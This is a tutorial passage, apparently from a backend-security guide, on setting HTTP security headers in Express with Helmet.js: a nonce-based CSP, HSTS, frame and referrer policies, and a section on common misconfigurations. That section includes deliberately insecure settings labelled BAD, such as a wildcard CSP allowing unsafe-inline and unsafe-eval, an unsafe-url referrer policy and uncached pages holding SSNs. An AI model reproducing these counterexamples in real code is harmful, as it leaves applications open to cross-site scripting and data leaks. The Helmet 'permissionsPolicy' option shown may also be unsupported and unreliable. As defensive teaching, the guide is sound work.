Use **Helmet.js** with custom configuration for production-ready security headers.

**Step 1: Install Helmet**

```bash
npm install helmet
```

**Step 2: Basic Setup (Quick Win)**

```javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// ✅ Apply all default security headers
app.use(helmet());

// Your routes...
app.get('/', (req, res) => {
  res.send('Secure app!');
});

app.listen(3000);
```

**What This Does:**

```
✅ Content-Security-Policy (strict defaults)
✅ X-DNS-Prefetch-Control (off)
✅ X-Frame-Options (SAMEORIGIN)
✅ X-Powered-By (removed)
✅ Strict-Transport-Security (HTTPS only)
✅ X-Download-Options (no open)
✅ X-Content-Type-Options (nosniff)
✅ Referrer-Policy (no-referrer)
✅ X-Permitted-Cross-Domain-Policies (none)
```

**Step 3: Production Configuration**

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// Generate nonce for CSP
app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Production security headers
app.use(
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      useDefaults: false,
      directives: {
        defaultSrc: ["'self'"],

        scriptSrc: [
          "'self'",
          // Dynamic nonce for inline scripts
          (req, res) => `'nonce-${res.locals.cspNonce}'`,
          // Trusted CDNs
          "cdn.jsdelivr.net",
          "cdnjs.cloudflare.com",
        ],

        styleSrc: [
          "'self'",
          "'unsafe-inline'", // Required for many CSS frameworks
          "fonts.googleapis.com",
          "cdn.jsdelivr.net",
        ],

        imgSrc: [
          "'self'",
          "data:", // Base64 images
          "https:", // Any HTTPS image
          "blob:", // Blob URLs
        ],

        fontSrc: [
          "'self'",
          "fonts.gstatic.com",
          "data:",
        ],

        connectSrc: [
          "'self'",
          "api.example.com",
          process.env.NODE_ENV === 'development' && 'ws://localhost:*', // Hot reload in dev
        ].filter(Boolean),

        frameSrc: [
          "'self'",
          "www.youtube.com",
          "www.youtube-nocookie.com",
        ],

        mediaSrc: ["'self'"],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        formAction: ["'self'"],
        frameAncestors: ["'self'"], // Clickjacking protection

        upgradeInsecureRequests: [], // Upgrade HTTP to HTTPS
        blockAllMixedContent: [], // Block HTTP on HTTPS page
      },
      reportOnly: process.env.NODE_ENV === 'development', // Report-only in dev
    },

    // Strict Transport Security (HSTS)
    hsts: {
      maxAge: 31536000, // 1 year in seconds
      includeSubDomains: true,
      preload: true,
    },

    // Frame protection
    frameguard: {
      action: 'sameorigin', // or 'deny' for never allow framing
    },

    // MIME sniffing protection
    noSniff: true,

    // Referrer Policy
    referrerPolicy: {
      policy: 'strict-origin-when-cross-origin',
    },

    // Permissions Policy
    permissionsPolicy: {
      features: {
        accelerometer: [],
        ambientLightSensor: [],
        autoplay: [],
        battery: [],
        camera: [],
        displayCapture: [],
        documentDomain: [],
        encryptedMedia: [],
        fullscreen: ["'self'"],
        geolocation: [],
        gyroscope: [],
        magnetometer: [],
        microphone: [],
        midi: [],
        payment: [],
        pictureInPicture: [],
        publicKeyCredentials: ["'self'"],
        screenWakeLock: [],
        syncXhr: [],
        usb: [],
        xrSpatialTracking: [],
      },
    },

    // Cross-Origin Policies
    crossOriginOpenerPolicy: {
      policy: 'same-origin',
    },

    crossOriginEmbedderPolicy: {
      policy: 'require-corp',
    },

    crossOriginResourcePolicy: {
      policy: 'same-origin',
    },

    // DNS prefetch control
    dnsPrefetchControl: {
      allow: false,
    },

    // Hide X-Powered-By
    hidePoweredBy: true,
  })
);

// Additional custom headers
app.use((req, res, next) => {
  // Remove X-XSS-Protection (deprecated, can cause vulnerabilities)
  res.removeHeader('X-XSS-Protection');

  // Generic server header
  res.setHeader('Server', 'webserver');

  // Cache control for sensitive pages
  if (req.path.includes('/dashboard') || req.path.includes('/account')) {
    res.setHeader(
      'Cache-Control',
      'no-store, no-cache, must-revalidate, private'
    );
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
  }

  next();
});

// CSP violation reporting (production only)
if (process.env.NODE_ENV === 'production') {
  app.post(
    '/csp-report',
    express.json({ type: 'application/csp-report' }),
    (req, res) => {
      console.error('CSP Violation:', req.body);
      // Send to logging service (Sentry, Datadog, etc.)
      res.status(204).end();
    }
  );
}

// Routes with nonce in templates
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>Secure App</title>

        <!-- Inline script with nonce -->
        <script nonce="${res.locals.cspNonce}">
          console.log('This is allowed by CSP');
        </script>
      </head>
      <body>
        <h1>Secure Application</h1>
      </body>
    </html>
  `);
});

// Error handling
app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Secure server running on port ${PORT}`);
});
```

**Step 4: Environment-Specific Configuration**

```javascript
// config/helmet.js
module.exports = {
  development: {
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"], // Allow hot reload
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "ws://localhost:*"], // WebSocket for hot reload
      },
      reportOnly: true, // Don't block in development
    },
    hsts: false, // No HSTS in development (not using HTTPS locally)
  },

  production: {
    // Use production config from above
    contentSecurityPolicy: {
      // ... strict policy
      reportOnly: false, // Enforce in production
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  },
};

// app.js
const helmetConfig = require('./config/helmet')[process.env.NODE_ENV || 'development'];
app.use(helmet(helmetConfig));
```

**Step 5: Testing**

```bash
# Test with curl
curl -I https://example.com

# Check specific header
curl -I https://example.com | grep -i "content-security-policy"

# Use online tools
# https://securityheaders.com/?q=https://example.com
# https://observatory.mozilla.org/analyze/example.com
```

**Key Practices:**

```
✅ Use Helmet.js for easy setup
✅ Generate nonces for inline scripts
✅ Use report-only mode in development
✅ Customize CSP for your app's needs
✅ Test thoroughly with real URLs
✅ Monitor CSP violations in production
✅ Different configs for dev vs prod
✅ Remove X-Powered-By header
✅ Set appropriate Cache-Control
✅ Use environment variables for API URLs
```

**Key Insight:**
> **Helmet.js provides sensible defaults, but customize for your app.** Start with defaults, test your app, adjust CSP directives as needed. Use report-only mode first to avoid breaking your site, then enforce once violations are fixed. Monitor CSP violations in production to detect attacks and misconfigurations.

---

### Q5: What security issues can occur if security headers are misconfigured?

**Answer:**

Misconfigured security headers can **create new vulnerabilities** or **break legitimate functionality**.

**1. CSP Too Permissive**

```javascript
// ❌ BAD - Defeats the purpose
Content-Security-Policy: default-src *; script-src * 'unsafe-inline' 'unsafe-eval'

// Problems:
// - Allows scripts from ANY origin
// - Allows inline scripts (XSS vulnerability)
// - Allows eval() (XSS vulnerability)
// Result: No protection against XSS!

// ✅ GOOD - Strict policy
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com; object-src 'none'
```

**2. Mixing HTTP and HTTPS with HSTS**

```javascript
// ❌ BAD - HSTS on mixed content site
Strict-Transport-Security: max-age=31536000; includeSubDomains

// If site loads HTTP resources:
// <script src="http://example.com/script.js"></script>

// Browser blocks the resource:
// "Mixed Content: The page was loaded over HTTPS, but requested an insecure script"
// Site breaks completely!

// ✅ GOOD - Fix all HTTP resources first
// 1. Change all resources to HTTPS
// 2. Use CSP upgrade-insecure-requests
// 3. Then enable HSTS
```

**3. X-Frame-Options Conflicts**

```javascript
// ❌ BAD - Conflicting directives
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'self' https://trusted.com

// Browser uses CSP (overrides X-Frame-Options)
// Your site CAN be framed by trusted.com
// But you thought DENY meant never!

// ✅ GOOD - Make them consistent
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
// Both allow same-origin framing
```

**4. CSP Breaking Third-Party Services**

```javascript
// ❌ BAD - Blocks Google Analytics
Content-Security-Policy: default-src 'self'; script-src 'self'

// Breaks:
// - Google Analytics (needs www.google-analytics.com)
// - Google Fonts (needs fonts.googleapis.com, fonts.gstatic.com)
// - Stripe (needs js.stripe.com)
// - CDNs (needs cdn.example.com)

// ✅ GOOD - Whitelist required domains
Content-Security-Policy:
  default-src 'self';
  script-src 'self' www.google-analytics.com js.stripe.com cdn.jsdelivr.net;
  font-src 'self' fonts.gstatic.com;
  connect-src 'self' www.google-analytics.com;
  style-src 'self' fonts.googleapis.com;
  img-src 'self' data: https:
```

**5. Report-URI/report-to Never Checked**

```javascript
// ❌ BAD - Set up reporting but never monitor
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  report-uri /csp-violations

// Endpoint exists but violations never reviewed
// Result: Don't know about:
// - Actual attacks being blocked
// - Legitimate resources being blocked (false positives)
// - Misconfigurations in your policy

// ✅ GOOD - Monitor and act on reports
app.post('/csp-violations', (req, res) => {
  console.error('CSP Violation:', req.body);

  // Send to monitoring service
  logger.error('CSP_VIOLATION', {
    blockedUri: req.body['csp-report']['blocked-uri'],
    violatedDirective: req.body['csp-report']['violated-directive'],
    documentUri: req.body['csp-report']['document-uri'],
  });

  // Alert on suspicious patterns
  if (req.body['csp-report']['blocked-uri'].includes('evil.com')) {
    alertSecurityTeam('Possible XSS attack detected');
  }

  res.status(204).end();
});
```

**6. Overly Restrictive Permissions-Policy**

```javascript
// ❌ BAD - Blocks features your app needs
Permissions-Policy: geolocation=(), camera=(), microphone=(), fullscreen=()

// If your app is a video conferencing tool:
// - Camera doesn't work
// - Microphone doesn't work
// - Fullscreen doesn't work
// App is completely broken!

// ✅ GOOD - Allow features you need
Permissions-Policy:
  geolocation=(),
  camera=(self),
  microphone=(self),
  fullscreen=(self),
  payment=()
```

**7. Referrer-Policy Leaking Sensitive Data**

```javascript
// ❌ BAD - Leaks tokens in URL
Referrer-Policy: unsafe-url

// User on: https://app.com/dashboard?token=secret123
// Clicks external link: https://external.com
// External site receives: Referer: https://app.com/dashboard?token=secret123
// Token leaked!

// ✅ GOOD - Protect sensitive URLs
Referrer-Policy: strict-origin-when-cross-origin

// External site receives: Referer: https://app.com
// Token protected!
```

**8. HSTS Preload Without Testing**

```javascript
// ❌ BAD - Add preload without testing
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// Submit to hstspreload.org
// Site gets added to browser preload list

// Problem: Found an HTTP subdomain you need
// subdomain.example.com (needs HTTP for legacy reasons)

// Result: PERMANENTLY BROKEN for all Chrome users
// Can't remove from preload list easily!

// ✅ GOOD - Test thoroughly first
// 1. Test HSTS without preload for 6 months
// 2. Ensure ALL subdomains support HTTPS
// 3. Test includeSubDomains thoroughly
// 4. Only then submit to preload list
```

**9. Cache-Control Misconfiguration**

```javascript
// ❌ BAD - Caching sensitive data
app.get('/dashboard', (req, res) => {
  // No cache headers set
  res.send(`
    <h1>Welcome, ${user.name}</h1>
    <p>Balance: $${user.balance}</p>
    <p>SSN: ${user.ssn}</p>
  `);
});

// Browser caches the page
// Result: Sensitive data in browser cache
// Next user on shared computer sees previous user's data!

// ✅ GOOD - Disable caching for sensitive pages
app.get('/dashboard', (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');

  res.send(`
    <h1>Welcome, ${user.name}</h1>
    <p>Balance: $${user.balance}</p>
    <p>SSN: ${user.ssn}</p>
  `);
});
```

**10. X-XSS-Protection Enabled (Creates Vulnerabilities)**

```javascript
// ❌ BAD - X-XSS-Protection enabled
X-XSS-Protection: 1; mode=block

// Known issues:
// 1. Can be exploited to CREATE vulnerabilities
// 2. False positives block legitimate content
// 3. Deprecated in modern browsers
// 4. CSP is more effective

// ✅ GOOD - Disable it, use CSP
X-XSS-Protection: 0
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
```

**Common Mistakes Summary:**

```
❌ CSP too permissive ('unsafe-inline', 'unsafe-eval', *)
❌ Not testing in report-only mode first
❌ Conflicting X-Frame-Options and CSP frame-ancestors
❌ HSTS on mixed content site
❌ HSTS preload without thorough testing
❌ Forgetting to whitelist required third-party services
❌ Never monitoring CSP violation reports
❌ Permissions-Policy blocking features you need
❌ Referrer-Policy leaking sensitive URLs
❌ Caching sensitive data
❌ Using deprecated X-XSS-Protection
```

**Key Insight:**
> **Always test security headers in staging first.** Use report-only mode for CSP, monitor violations, and gradually tighten policies. Misconfigured headers can break your site or create new vulnerabilities. Test with real browsers, check console for violations, and use tools like securityheaders.com to validate your configuration.

---

## Best Practices

### ✅ Do's

**1. Use Helmet.js**
- ✅ Easy setup with sensible defaults
- ✅ Actively maintained
- ✅ Comprehensive coverage
- ✅ Production-ready

**2. Start with Report-Only Mode**
- ✅ Test CSP without breaking site
- ✅ Monitor violations first
- ✅ Fix issues before enforcing
- ✅ Gradual rollout

**3. Generate Nonces for Inline Scripts**
- ✅ Avoid 'unsafe-inline'
- ✅ Random nonce per request
- ✅ Secure inline scripts
- ✅ Better than hashes

**4. Whitelist Only Required Origins**
- ✅ Minimal CSP directives
- ✅ Specific domains only
- ✅ Regular audits
- ✅ Remove unused sources

**5. Test Thoroughly**
- ✅ Use securityheaders.com
- ✅ Use observatory.mozilla.org
- ✅ Test in real browsers
- ✅ Check console for violations

**6. Monitor CSP Violations**
- ✅ Set up report-uri
- ✅ Log to monitoring service
- ✅ Review regularly
- ✅ Alert on suspicious patterns

**7. Use HSTS with Preload**
- ✅ After thorough testing
- ✅ All subdomains support HTTPS
- ✅ 1 year max-age
- ✅ Submit to hstspreload.org

**8. Environment-Specific Config**
- ✅ Stricter in production
- ✅ Looser in development
- ✅ Use environment variables
- ✅ Separate configs

**9. Keep Headers Updated**
- ✅ Follow security advisories
- ✅ Update Helmet.js regularly
- ✅ Adopt new standards
- ✅ Remove deprecated headers

**10. Defense in Depth**
- ✅ Headers + secure code
- ✅ Multiple protection layers
- ✅ CSP + input validation
- ✅ Comprehensive approach

### ❌ Don'ts

**1. Never Use 'unsafe-inline' or 'unsafe-eval'**
- ❌ Defeats CSP purpose
- ❌ Allows XSS attacks
- ❌ Use nonces instead
- ❌ Refactor code if needed

**2. Never Deploy Without Testing**
- ❌ Don't skip staging tests
- ❌ Use report-only mode first
- ❌ Test all pages
- ❌ Check third-party integrations

**3. Never Ignore CSP Violations**
- ❌ Don't set up reporting and forget
- ❌ Review violations regularly
- ❌ Fix false positives
- ❌ Investigate suspicious patterns

**4. Never Use Wildcard in CSP**
- ❌ No `default-src *`
- ❌ No `script-src *`
- ❌ Specific domains only
- ❌ Defeats the purpose

**5. Never Enable X-XSS-Protection**
- ❌ Deprecated
- ❌ Creates vulnerabilities
- ❌ Use CSP instead
- ❌ Set to 0 to disable

**6. Never Mix HTTP and HTTPS with HSTS**
- ❌ Fix all HTTP resources first
- ❌ Use upgrade-insecure-requests
- ❌ Test thoroughly
- ❌ Then enable HSTS

**7. Never Use HSTS Preload Lightly**
- ❌ Hard to undo
- ❌ Affects all subdomains
- ❌ Test for 6+ months first
- ❌ Permanent commitment

**8. Never Cache Sensitive Pages**
- ❌ Set Cache-Control: no-store
- ❌ Especially for authenticated pages
- ❌ Disable browser caching
- ❌ Prevent data leaks

**9. Never Use Conflicting Headers**
- ❌ Align X-Frame-Options with CSP
- ❌ Consistent policies
- ❌ CSP takes precedence
- ❌ Document decisions

**10. Never Set and Forget**
- ❌ Regular security audits
- ❌ Update as app changes
- ❌ Monitor for new vulnerabilities
- ❌ Stay current with standards

## Summary

- **Security headers** are HTTP response headers that control browser behavior
- **Easy to implement** with Helmet.js or manual configuration
- **Content-Security-Policy (CSP)** is the most powerful - prevents XSS and code injection
- **HSTS** forces HTTPS and prevents SSL stripping attacks
- **X-Frame-Options** or CSP frame-ancestors prevent clickjacking
- **X-Content-Type-Options** prevents MIME sniffing attacks
- **Referrer-Policy** protects sensitive data in URLs
- **Permissions-Policy** controls browser features and APIs
- **Always test** in report-only mode before enforcing
- **Monitor violations** to detect attacks and misconfigurations
- **Use nonces** for inline scripts instead of 'unsafe-inline'
- **Defense in depth** - headers complement secure code, don't replace it

---
[← Back to Backend Security](../README.md)
